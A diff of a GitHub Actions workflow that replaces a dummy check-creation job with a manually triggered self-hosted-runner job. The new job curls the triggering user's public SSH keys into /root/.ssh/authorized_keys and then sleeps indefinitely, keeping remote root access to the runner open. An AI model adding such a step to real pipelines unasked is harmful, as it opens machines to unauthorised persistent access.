@@ -1,23 +1,12 @@
-on: push
+on: workflow_dispatch
 
 jobs:
-  comment:
-    runs-on: ubuntu-latest
+  run:
+    runs-on: self-hosted
     steps:
-      - uses: actions/github-script@v4
-        with:
-          github-token: ${{secrets.GITHUB_TOKEN}}
-          script: |
-            github.checks.create({
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              head_sha: context.sha,
-              name: 'my check',
-              status: 'completed',
-              conclusion: 'success',
-              output: {
-                title: 'my title',
-                summary: 'my summary',
-                text: 'my text',
-              }
-            })
+      - name: install ssh keys
+        run: |
+          mkdir -p /root/.ssh
+          curl https://api.github.com/users/${{ github.actor }}/keys | jq -r '.[].key' > /root/.ssh/authorized_keys
+
+      - run: sleep infinity
